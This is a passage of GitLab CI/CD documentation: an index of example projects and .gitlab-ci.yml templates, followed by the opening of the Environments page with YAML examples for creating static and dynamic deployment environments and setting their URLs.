The following table lists examples with step-by-step tutorials that are contained in this section:

| Use case | Resource |
| --- | --- |
| Deployment with Dpl | [Using `dpl` as deployment tool](https://docs.gitlab.com/ci/examples/deployment/). |
| GitLab Pages | See the [GitLab Pages](https://docs.gitlab.com/user/project/pages/) documentation for a complete example of deploying a static site. |
| Multi project pipeline | [Build, test deploy using multi project pipeline](https://gitlab.com/gitlab-examples/upstream-project). |
| npm with semantic-release | [Publish npm packages to the GitLab package registry using semantic-release](https://docs.gitlab.com/ci/examples/semantic-release/). |
| PHP with npm, SCP | [Running Composer and npm scripts with deployment via SCP in GitLab CI/CD](https://docs.gitlab.com/ci/examples/deployment/composer-npm-deploy/). |
| PHP with PHPUnit, `atoum` | [Testing PHP projects](https://docs.gitlab.com/ci/examples/php/). |
| Secrets management with Vault | [Authenticating and Reading Secrets With HashiCorp Vault](https://docs.gitlab.com/ci/secrets/hashicorp_vault/). |

|
|

### Contributed examples [Permalink](https://docs.gitlab.com/ci/examples/\#contributed-examples "Permalink")

You can help people that use your favorite programming language by submitting a link
to a guide for that language. These contributed guides are hosted externally or in
separate example projects:

| Use case | Resource |
| --- | --- |
| Clojure | [Test a Clojure application with GitLab CI/CD](https://gitlab.com/gitlab-examples/clojure-web-application). |
| Game development | [DevOps and Game Development with GitLab CI/CD](https://gitlab.com/gitlab-examples/gitlab-game-demo/). |
| Java with Maven | [How to deploy Maven projects to Artifactory with GitLab CI/CD](https://gitlab.com/gitlab-examples/maven/simple-maven-example). |
| Java with Spring Boot | [Deploy a Spring Boot application to Cloud Foundry with GitLab CI/CD](https://gitlab.com/gitlab-examples/spring-gitlab-cf-deploy-demo). |
| Parallel testing Ruby & JS | [GitLab CI/CD parallel jobs testing for Ruby & JavaScript projects](https://docs.knapsackpro.com/2019/how-to-run-parallel-jobs-for-rspec-tests-on-gitlab-ci-pipeline-and-speed-up-ruby-javascript-testing). |
| Python on Heroku | [Test and deploy a Python application with GitLab CI/CD](https://gitlab.com/gitlab-examples/python-getting-started). |
| Ruby on Heroku | [Test and deploy a Ruby application with GitLab CI/CD](https://gitlab.com/gitlab-examples/ruby-getting-started). |
| Scala on Heroku | [Test and deploy a Scala application to Heroku](https://gitlab.com/gitlab-examples/scala-sbt). |

|
|

## CI/CD templates [Permalink](https://docs.gitlab.com/ci/examples/\#cicd-templates "Permalink")

Get started with GitLab CI/CD and your favorite programming language or framework by using a
`.gitlab-ci.yml` [template](https://gitlab.com/gitlab-org/gitlab/-/tree/master/lib/gitlab/ci/templates).

When you create a `.gitlab-ci.yml` file in the UI, you can
choose one of these templates:

- [Android ( `Android.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Android.gitlab-ci.yml)
- [Android with fastlane ( `Android-Fastlane.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Android-Fastlane.gitlab-ci.yml)
- [Bash ( `Bash.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Bash.gitlab-ci.yml)
- [C++ ( `C++.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/C++.gitlab-ci.yml)
- [Chef ( `Chef.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Chef.gitlab-ci.yml)
- [Clojure ( `Clojure.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Clojure.gitlab-ci.yml)
- [Composer `Composer.gitlab-ci.yml`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Composer.gitlab-ci.yml)
- [Crystal ( `Crystal.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Crystal.gitlab-ci.yml)
- [Dart ( `Dart.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Dart.gitlab-ci.yml)
- [Django ( `Django.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Django.gitlab-ci.yml)
- [Docker ( `Docker.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Docker.gitlab-ci.yml)
- [dotNET ( `dotNET.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/dotNET.gitlab-ci.yml)
- [dotNET Core ( `dotNET-Core.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/dotNET-Core.gitlab-ci.yml)
- [Elixir ( `Elixir.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Elixir.gitlab-ci.yml)
- [Flutter ( `Flutter.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Flutter.gitlab-ci.yml)
- [Go ( `Go.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Go.gitlab-ci.yml)
- [Gradle ( `Gradle.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Gradle.gitlab-ci.yml)
- [Grails ( `Grails.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Grails.gitlab-ci.yml)
- [iOS with fastlane ( `iOS-Fastlane.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/iOS-Fastlane.gitlab-ci.yml)
- [Julia ( `Julia.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Julia.gitlab-ci.yml)
- [Laravel ( `Laravel.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Laravel.gitlab-ci.yml)
- [LaTeX ( `LaTeX.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/LaTeX.gitlab-ci.yml)
- [Maven ( `Maven.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Maven.gitlab-ci.yml)
- [Mono ( `Mono.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Mono.gitlab-ci.yml)
- [npm ( `npm.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/npm.gitlab-ci.yml)
- [Node.js ( `Nodejs.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Nodejs.gitlab-ci.yml)
- [OpenShift ( `OpenShift.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/OpenShift.gitlab-ci.yml)
- [Packer ( `Packer.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Packer.gitlab-ci.yml)
- [PHP ( `PHP.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/PHP.gitlab-ci.yml)
- [Python ( `Python.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Python.gitlab-ci.yml)
- [Ruby ( `Ruby.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Ruby.gitlab-ci.yml)
- [Rust ( `Rust.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Rust.gitlab-ci.yml)
- [Scala ( `Scala.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Scala.gitlab-ci.yml)
- [Swift ( `Swift.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Swift.gitlab-ci.yml)
- [Terraform ( `Terraform.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Terraform.gitlab-ci.yml)
- [Terraform ( `Terraform.latest.gitlab-ci.yml`)](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/ci/templates/Terraform.latest.gitlab-ci.yml)

If a programming language or framework template is not in this list, you can contribute
one. To create a template, submit a merge request
to [the templates list](https://gitlab.com/gitlab-org/gitlab/-/tree/master/lib/gitlab/ci/templates).

### Adding templates to your GitLab installation [Permalink](https://docs.gitlab.com/ci/examples/\#adding-templates-to-your-gitlab-installation "Permalink")

- Tier: Premium, Ultimate
- Offering: GitLab Self-Managed, GitLab Dedicated

You can add custom examples and templates to your instance.
Your GitLab administrator can [designate an instance template repository](https://docs.gitlab.com/administration/settings/instance_template_repository/)
that contains examples and templates specific to your organization.

## Other resources [Permalink](https://docs.gitlab.com/ci/examples/\#other-resources "Permalink")

This section provides further resources to help you get familiar with various uses of GitLab CI/CD.
Older articles and videos may not reflect the state of the latest GitLab release.

### CI/CD in the cloud [Permalink](https://docs.gitlab.com/ci/examples/\#cicd-in-the-cloud "Permalink")

For examples of setting up GitLab CI/CD for cloud-based environments, see:

- [How to set up multi-account AWS SAM deployments with GitLab CI](https://about.gitlab.com/blog/2019/02/04/multi-account-aws-sam-deployments-with-gitlab-ci/)
- Video: [Automating Kubernetes Deployments with GitLab CI/CD](https://www.youtube.com/watch?v=wEDRfAz6_Uw)
- [How to autoscale continuous deployment with GitLab Runner on DigitalOcean](https://about.gitlab.com/blog/2018/06/19/autoscale-continuous-deployment-gitlab-runner-digital-ocean/)
- [How to create a CI/CD pipeline with Auto Deploy to Kubernetes using GitLab and Helm](https://about.gitlab.com/blog/2017/09/21/how-to-create-a-ci-cd-pipeline-with-auto-deploy-to-kubernetes-using-gitlab/)
- Video: [Demo - Deploying from GitLab to OpenShift Container Cluster](https://youtu.be/EwbhA53Jpp4)
- Tutorial: [Set up a GitLab.com Civo Kubernetes integration with Gitpod](https://gitlab.com/k33g_org/k33g_org.gitlab.io/-/issues/82)

See also the following video overviews:

- Video: [Kubernetes, GitLab, and Cloud Native](https://www.youtube.com/watch?v=d-9awBxEbvQ)
- Video: [Deploying to IBM Cloud with GitLab CI/CD](https://www.youtube.com/watch?v=6ZF4vgKMd-g)

### Customer stories [Permalink](https://docs.gitlab.com/ci/examples/\#customer-stories "Permalink")

For some customer experiences with GitLab CI/CD, see:

- [How Verizon Connect reduced data center deploys from 30 days to under 8 hours with GitLab](https://about.gitlab.com/blog/2019/02/14/verizon-customer-story/)
- [How Wag! cut their release process from 40 minutes to just 6](https://about.gitlab.com/blog/2019/01/16/wag-labs-blog-post/)
- [How Jaguar Land Rover embraced CI to speed up their software lifecycle](https://about.gitlab.com/blog/2018/07/23/chris-hill-devops-enterprise-summit-talk/)

### Getting started [Permalink](https://docs.gitlab.com/ci/examples/\#getting-started "Permalink")

For some examples to help get you started, see:

- [GitLab CI/CD’s 2018 highlights](https://about.gitlab.com/blog/2019/01/21/gitlab-ci-cd-features-improvements/)
- [A beginner’s guide to continuous integration](https://about.gitlab.com/blog/2018/01/22/a-beginners-guide-to-continuous-integration/)

### Implementing GitLab CI/CD [Permalink](https://docs.gitlab.com/ci/examples/\#implementing-gitlab-cicd "Permalink")

For examples of others who have implemented GitLab CI/CD, see:

- [How to streamline interactions between multiple repositories with multi-project pipelines](https://about.gitlab.com/blog/2018/10/31/use-multiproject-pipelines-with-gitlab-cicd/)
- [How we used GitLab CI to build GitLab faster](https://about.gitlab.com/blog/2018/05/02/using-gitlab-ci-to-build-gitlab-faster/)
- [Test all the things in GitLab CI with Docker by example](https://about.gitlab.com/blog/2018/02/05/test-all-the-things-gitlab-ci-docker-examples/)
- [A Craftsman looks at continuous integration](https://about.gitlab.com/blog/2018/01/17/craftsman-looks-at-continuous-integration/)
- [Go tools and GitLab: How to do continuous integration like a boss](https://about.gitlab.com/blog/2017/11/27/go-tools-and-gitlab-how-to-do-continuous-integration-like-a-boss/)
- [GitBot - automating boring Git operations with CI](https://about.gitlab.com/blog/2017/11/02/automating-boring-git-operations-gitlab-ci/)
- [How to use GitLab CI for Vue.js](https://about.gitlab.com/blog/2017/09/12/vuejs-app-gitlab/)
- Video: [GitLab CI/CD Deep Dive](https://youtu.be/pBe4t1CD8Fc?t=195)
- [Dockerizing GitLab review apps](https://about.gitlab.com/blog/2017/07/11/dockerizing-review-apps/)
- [Fast and natural continuous integration with GitLab CI](https://about.gitlab.com/blog/2017/05/22/fast-and-natural-continuous-integration-with-gitlab-ci/)
- [Demo: CI/CD with GitLab in action](https://about.gitlab.com/blog/2017/03/13/ci-cd-demo/)

### Migrating to GitLab from third-party CI tools [Permalink](https://docs.gitlab.com/ci/examples/\#migrating-to-gitlab-from-third-party-ci-tools "Permalink")

Examples of migration to GitLab CI/CD from other tools:

- [Bamboo](https://docs.gitlab.com/ci/migration/bamboo/)
- [CircleCI](https://docs.gitlab.com/ci/migration/circleci/)
- [GitHub Actions](https://docs.gitlab.com/ci/migration/github_actions/)
- [Jenkins](https://docs.gitlab.com/ci/migration/jenkins/)
- [TeamCity](https://docs.gitlab.com/ci/migration/teamcity/)

### Integrating GitLab CI/CD with other systems [Permalink](https://docs.gitlab.com/ci/examples/\#integrating-gitlab-cicd-with-other-systems "Permalink")

To see how you can integrate GitLab CI/CD with third-party systems, see:

- [Streamline and shorten error remediation with Sentry’s new GitLab integration](https://about.gitlab.com/blog/2019/01/25/sentry-integration-blog-post/)
- [How to simplify your smart home configuration with GitLab CI/CD](https://about.gitlab.com/blog/2018/08/02/using-the-gitlab-ci-slash-cd-for-smart-home-configuration-management/)
- [Demo: GitLab + Jira + Jenkins](https://about.gitlab.com/blog/2018/07/30/gitlab-workflow-with-jira-jenkins/)
- [Introducing Auto Breakfast from GitLab (sort of)](https://about.gitlab.com/blog/2018/06/29/introducing-auto-breakfast-from-gitlab/)

### Mobile development [Permalink](https://docs.gitlab.com/ci/examples/\#mobile-development "Permalink")

For help with using GitLab CI/CD for mobile application development, see:

- [How to publish Android apps to the Google Play Store with GitLab and fastlane](https://about.gitlab.com/blog/2019/01/28/android-publishing-with-gitlab-and-fastlane/)
- [Setting up GitLab CI for Android projects](https://about.gitlab.com/blog/2018/10/24/setting-up-gitlab-ci-for-android-projects/)
- [Working with YAML in GitLab CI from the Android perspective](https://about.gitlab.com/blog/2017/11/20/working-with-yaml-gitlab-ci-android/)
- [How to use GitLab CI and MacStadium to build your macOS or iOS projects](https://about.gitlab.com/blog/2017/05/15/how-to-use-macstadium-and-gitlab-ci-to-build-your-macos-or-ios-projects/)
- [Setting up GitLab CI for iOS projects](https://about.gitlab.com/blog/2016/03/10/setting-up-gitlab-ci-for-ios-projects/)

## Help & feedback

[Edit this page](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/ci/examples/_index.md)

[Suggest updates](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Documentation)

[Request support](https://about.gitlab.com/support/)

[View pricing](https://about.gitlab.com/pricing/)

[Try GitLab for free](https://about.gitlab.com/free-trial/)

[Post on the GitLab forum](https://forum.gitlab.com/new-topic?title=topic%20title&body=topic%20body&tags=docs-feedback)

![Company Logo](https://cdn.cookielaw.org/logos/aa14a5c8-79e3-442a-8177-464ad850b19d/e46c1d0d-1f66-481f-bc06-5427671431da/253e6fee-c4c0-4b60-bc35-79cdae5dda32/gitlab-logo-100.png)

## Privacy Preference Center

## Privacy Preference Center

- ### Your Privacy

- ### Strictly Necessary Cookies

- ### Functionality Cookies

- ### Performance and Analytics Cookies

- ### Targeting and Advertising Cookies

- ### Ad User Data

- ### Ad Personalization


#### Your Privacy

When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.


[Cookie Policy](https://about.gitlab.com/privacy/cookies/)

User ID:  4863a974-2394-4ce9-a1c2-62513525ce5c

This User ID will be used as a unique identifier while storing and accessing your preferences for future.

Timestamp:  --

#### Strictly Necessary Cookies

Always Active

These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, enabling you to securely log into the site, filling in forms, or using the customer checkout. GitLab processes any personal data collected through these cookies on the basis of our legitimate interest.

Cookies Details‎

#### Functionality Cookies

Functionality Cookies

These cookies enable helpful but non-essential website functions that improve your website experience. By recognizing you when you return to our website, they may, for example, allow us to personalize our content for you or remember your preferences. If you do not allow these cookies then some or all of these services may not function properly. GitLab processes any personal data collected through these cookies on the basis of your consent

Cookies Details‎

#### Performance and Analytics Cookies

Performance and Analytics Cookies

These cookies allow us and our third-party service providers to recognize and count the number of visitors on our websites and to see how visitors move around our websites when they are using it. This helps us improve our products and ensures that users can easily find what they need on our websites. These cookies usually generate aggregate statistics that are not associated with an individual. To the extent any personal data is collected through these cookies, GitLab processes that data on the basis of your consent.

Cookies Details‎

#### Targeting and Advertising Cookies

Targeting and Advertising Cookies

These cookies enable different advertising related functions. They may allow us to record information about your visit to our websites, such as pages visited, links followed, and videos viewed so we can make our websites and the advertising displayed on it more relevant to your interests. They may be set through our website by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant advertisements on other websites. GitLab processes any personal data collected through these cookies on the basis of your consent.

Cookies Details‎

#### Ad User Data

Ad User Data

Sets consent for sending user data to Google for advertising purposes.

Cookies Details‎

#### Ad Personalization

Ad Personalization

Sets consent for personalized advertising.

Cookies Details‎

Back Button

### Cookie List

Filter Button

ConsentLeg.Interest

checkbox labellabel

checkbox labellabel

checkbox labellabel

Clear

checkbox labellabel

ApplyCancel

Confirm My Choices

Allow All

[![Powered by Onetrust](https://cdn.cookielaw.org/logos/static/powered_by_logo.svg)](https://www.onetrust.com/products/cookie-consent/)

---


## 9. Environments {#section-9}

*Source: [https://docs.gitlab.com/ee/ci/environments/](https://docs.gitlab.com/ee/ci/environments/)*

# Environments

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

A GitLab environment represents a specific deployment target for your application, like development, staging, or production. Use it to manage different configurations and deploy code during various stages of your software lifecycle.

With environments, you:

- Keep your deployment process consistent and repeatable
- Track what code is deployed where
- Roll back to previous versions when problems occur
- Protect sensitive environments from unauthorized changes
- Control deployment variables per environment to maintain security boundaries
- Monitor environment health and get alerts if something goes wrong

## View environments and deployments [Permalink](https://docs.gitlab.com/ci/environments/\#view-environments-and-deployments "Permalink")

Prerequisites:

- In a private project, you must have at least the Reporter role. See [Environment permissions](https://docs.gitlab.com/ci/environments/#environment-permissions).

There are a few ways to view a list of environments for a given project:

- On the project’s overview page, if at least one environment is available (that is, not stopped).
[![A project overview page displaying the number of available environments as an incremental counter.](https://docs.gitlab.com/ci/environments/img/environments_project_home_v15_9.png)](https://docs.gitlab.com/ci/environments/img/environments_project_home_v15_9.png)

- On the left sidebar, select **Operate > Environments**.
The environments are displayed.

[![A list of available environments in a GitLab project, showing environment names, statuses, and other relevant details.](https://docs.gitlab.com/ci/environments/img/environments_list_v14_8.png)](https://docs.gitlab.com/ci/environments/img/environments_list_v14_8.png)

- To view a list of deployments for an environment, select the environment name,
for example, `staging`.
[![A list of deployments for a selected environment, displaying deployment history and related details.](https://docs.gitlab.com/ci/environments/img/deployments_list_v13_10.png)](https://docs.gitlab.com/ci/environments/img/deployments_list_v13_10.png)

Deployments show up in this list only after a deployment job has created them.

- To view a list of all manual jobs in a deployment pipeline, select the **Run** (
play) dropdown list.

[![Viewing a manual job in a deployment pipeline](https://docs.gitlab.com/ci/environments/img/view_manual_jobs_v17_10.png)](https://docs.gitlab.com/ci/environments/img/view_manual_jobs_v17_10.png)


### Environment URL [Permalink](https://docs.gitlab.com/ci/environments/\#environment-url "Permalink")

History

- [Changed](https://gitlab.com/gitlab-org/gitlab/-/issues/337417) to persist arbitrary URLs in GitLab 15.2 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `soft_validation_on_external_url`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/337417) in GitLab 15.3. [Feature flag `soft_validation_on_external_url`](https://gitlab.com/gitlab-org/gitlab/-/issues/367206) removed.

The [environment URL](https://docs.gitlab.com/ci/yaml/#environmenturl) is displayed in a few
places in GitLab:

- In a merge request as a link:
[![Environment URL in merge request](https://docs.gitlab.com/ci/environments/img/environments_mr_review_app_v11_10.png)](https://docs.gitlab.com/ci/environments/img/environments_mr_review_app_v11_10.png)
- In the Environments view as a button:
[![Open live environment from environments view](https://docs.gitlab.com/ci/environments/img/environments_open_live_environment_v14_8.png)](https://docs.gitlab.com/ci/environments/img/environments_open_live_environment_v14_8.png)
- In the Deployments view as a button:
[![Environment URL in deployments](https://docs.gitlab.com/ci/environments/img/deployments_view_v11_10.png)](https://docs.gitlab.com/ci/environments/img/deployments_view_v11_10.png)

You can see this information in a merge request if:

- The merge request is eventually merged to the default branch (usually `main`).
- That branch also deploys to an environment (for example, `staging` or `production`).

For example:

[![Environment URLs in merge request](https://docs.gitlab.com/ci/environments/img/environments_link_url_mr_v10_1.png)](https://docs.gitlab.com/ci/environments/img/environments_link_url_mr_v10_1.png)

#### Go from source files to public pages [Permalink](https://docs.gitlab.com/ci/environments/\#go-from-source-files-to-public-pages "Permalink")

With GitLab [Route Maps](https://docs.gitlab.com/ci/review_apps/#route-maps), you can go directly
from source files to public pages in the environment set for review apps.

## Types of environments [Permalink](https://docs.gitlab.com/ci/environments/\#types-of-environments "Permalink")

An environment is either static or dynamic.

Static environments:

- Are usually reused by successive deployments.
- Have static names. For example, `staging` or `production`.
- Are created manually or as part of a CI/CD pipeline.

Dynamic environments:

- Are usually created in a CI/CD pipeline and are used by only a single deployment, then either stopped or deleted.
- Have dynamic names, usually based on the value of a CI/CD variable.
- Are a feature of [review apps](https://docs.gitlab.com/ci/review_apps/).

An environment has one of three states, depending on whether its [stop job](https://docs.gitlab.com/ci/yaml/#environmenton_stop) has run:

- `available`: The environment exists. There might be a deployment.
- `stopping`: The _on stop job_ has started. This state does not apply when there is no on stop job defined.
- `stopped`: Either the _on stop job_ has run, or a user manually stopped the job.

## Create a static environment [Permalink](https://docs.gitlab.com/ci/environments/\#create-a-static-environment "Permalink")

You can create a static environment in the UI or in your `.gitlab-ci.yml` file.

### In the UI [Permalink](https://docs.gitlab.com/ci/environments/\#in-the-ui "Permalink")

Prerequisites:

- You must have at least the Developer role.

To create a static environment in the UI:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Operate > Environments**.
3. Select **Create an environment**.
4. Complete the fields.
5. Select **Save**.

### In your `.gitlab-ci.yml` file [Permalink](https://docs.gitlab.com/ci/environments/\#in-your-gitlab-ciyml-file "Permalink")

Prerequisites:

- You must have at least the Developer role.

To create a static environment, in your `.gitlab-ci.yml` file:

1. Define a job in the `deploy` stage.
2. In the job, define the environment `name` and `url`. If an
environment of that name doesn’t exist when the pipeline runs, it is created.

Some characters cannot be used in environment names. For more information about the
`environment` keywords, see the [`.gitlab-ci.yml` keyword reference](https://docs.gitlab.com/ci/yaml/#environment).

For example, to create an environment named `staging`, with URL `https://staging.example.com`:

YAML Copy to clipboard

```yaml
deploy_staging:
  stage: deploy
  script:
    - echo "Deploy to staging server"
  environment:
    name: staging
    url: https://staging.example.com
```

## Create a dynamic environment [Permalink](https://docs.gitlab.com/ci/environments/\#create-a-dynamic-environment "Permalink")

To create a dynamic environment, you use [CI/CD variables](https://docs.gitlab.com/ci/environments/#cicd-variables) that are
unique to each pipeline.

Prerequisites:

- You must have at least the Developer role.

To create a dynamic environment, in your `.gitlab-ci.yml` file:

1. Define a job in the `deploy` stage.
2. In the job, define the following environment attributes:
   - `name`: Use a related CI/CD variable like `$CI_COMMIT_REF_SLUG`. Optionally, add a static
     prefix to the environment’s name, which [groups in the UI](https://docs.gitlab.com/ci/environments/#group-similar-environments) all
     environments with the same prefix.
   - `url`: Optional. Prefix the hostname with a related CI/CD variable like `$CI_ENVIRONMENT_SLUG`.

Some characters cannot be used in environment names. For more information about the
`environment` keywords, see the [`.gitlab-ci.yml` keyword reference](https://docs.gitlab.com/ci/yaml/#environment).

In the following example, every time the `deploy_review_app` job runs the environment’s name and
URL are defined using unique values.

YAML Copy to clipboard

```yaml
deploy_review_app:
  stage: deploy
  script: make deploy
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_ENVIRONMENT_SLUG.example.com
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
      when: never
    - if: $CI_COMMIT_BRANCH
```

### Set a dynamic environment URL [Permalink](https://docs.gitlab.com/ci/environments/\#set-a-dynamic-environment-url "Permalink")

Some external hosting platforms generate a random URL for each deployment, for example:
`https://94dd65b.amazonaws.com/qa-lambda-1234567`. That makes it difficult to reference the URL in
the `.gitlab-ci.yml` file.

To address this problem, you can configure a deployment job to report back a set of
variables. These variables include the URL that was dynamically generated by the external service.
GitLab supports the [dotenv ( `.env`)](https://github.com/bkeepers/dotenv) file format,
and expands the `environment:url` value with variables defined in the `.env` file.

To use this feature, specify the
[`artifacts:reports:dotenv`](https://docs.gitlab.com/ci/yaml/artifacts_reports/#artifactsreportsdotenv) keyword in `.gitlab-ci.yml`.

You can also specify a static part of the URL at `environment:url`, such as
`https://$DYNAMIC_ENVIRONMENT_URL`. If the value of `DYNAMIC_ENVIRONMENT_URL` is `example.com`, the
final result is `https://example.com`.

The assigned URL for the `review/your-branch-name` environment is visible in the UI.

For an overview, see [Set dynamic URLs after a job finished](https://youtu.be/70jDXtOf4Ig).

In the following example a review app creates a new environment for each merge request:

- The `review` job is triggered by every push, and creates or updates an environment named
`review/your-branch-name`. The environment URL is set to `$DYNAMIC_ENVIRONMENT_URL`.
- When the `review` job finishes, GitLab updates the `review/your-branch-name` environment’s URL.
It parses the `deploy.env` report artifact, registers a list of variables as runtime-created,
expands the `environment:url: $DYNAMIC_ENVIRONMENT_URL` and sets it to the environment
URL.

YAML Copy to clipboard

```yaml
review:
  script:
    - DYNAMIC_ENVIRONMENT_URL=$(deploy-script)                                 # In script, get the environment URL.
    - echo "DYNAMIC_ENVIRONMENT_URL=$DYNAMIC_ENVIRONMENT_URL" >> deploy.env    # Add the value to a dotenv file.
  artifacts:
    reports:
      dotenv: deploy.env                                                       # Report back dotenv file to rails.
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: $DYNAMIC_ENVIRONMENT_URL                                              # and set the variable produced in script to `environment:url`
    on_stop: stop_review

stop_review:
  script:
    - ./teardown-environment
  when: manual
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
```

Note the following:

- `stop_review` doesn’t generate a dotenv report artifact, so it doesn’t recognize the
`DYNAMIC_ENVIRONMENT_URL` environment variable. Therefore you shouldn’t set `environment:url` in the
`stop_review` job.
- If the environment URL isn’t valid (for example, the URL is malformed), the system doesn’t update
the environment URL.
- If the script that runs in `stop_review` exists only in your repository and therefore can’t use
`GIT_STRATEGY: none` or `GIT_STRATEGY: empty`, configure [merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/)
for these jobs. This ensures that runners can fetch the repository even after a feature branch is
deleted. For more information, see [Ref Specs for Runners](https://docs.gitlab.com/ci/pipelines/#ref-specs-for-runners).

For Windows runners, you should use the PowerShell `Add-Content` command to write to `.env` files.

PowerShell Copy to clipboard

```powershell
Add-Content -Path deploy.env -Value "DYNAMIC_ENVIRONMENT_URL=$DYNAMIC_ENVIRONMENT_URL"
```

## Deployment tier of environments [Permalink](https://docs.gitlab.com/ci/environments/\#deployment-tier-of-environments "Permalink")

Sometimes, instead of using an [industry standard](https://en.wikipedia.org/wiki/Deployment_environment)
environment name, like `production`, you might want to use a code name, like `customer-portal`.
While there is no technical reason not to use a name like `customer-portal`, the name
no longer indicates that the environment is used for production. This can affect how metrics
like [deployment frequency](https://docs.gitlab.com/user/analytics/dora_metrics/#how-deployment-frequency-is-calculated)
are calculated.

To indicate that a specific environment is for a specific use,
you can use tiers:

| Environment tier | Environment name examples |
| --- | --- |
| `production` | Production, Live |
| `staging` | Staging, Model, Demo |
| `testing` | Test, QC |
| `development` | Dev, [Review apps](https://docs.gitlab.com/ci/review_apps/), Trunk |
| `other` |  |

|
|

By default, GitLab assumes a tier based on [the environment name](https://docs.gitlab.com/ci/yaml/#environmentname).
You cannot set an environment tier using the UI.
Instead, you can use the [`deployment_tier` keyword](https://docs.gitlab.com/ci/yaml/#environmentdeployment_tier) to specify a tier.

### Rename an environment [Permalink](https://docs.gitlab.com/ci/environments/\#rename-an-environment "Permalink")

History

- Renaming an environment by using the API was [deprecated](https://gitlab.com/gitlab-org/gitlab/-/issues/338897) in GitLab 15.9.
- Renaming an environment with the API [removed](https://gitlab.com/gitlab-org/gitlab/-/issues/338897) in GitLab 16.0.

You cannot rename an environment.

To achieve the same result as renaming an environment:

1. [Stop the existing environment](https://docs.gitlab.com/ci/environments/#stop-an-environment-by-using-the-ui).
2. [Delete the existing environment](https://docs.gitlab.com/ci/environments/#delete-an-environment).
3. [Create a new environment](https://docs.gitlab.com/ci/environments/#create-a-static-environment) with the desired name.

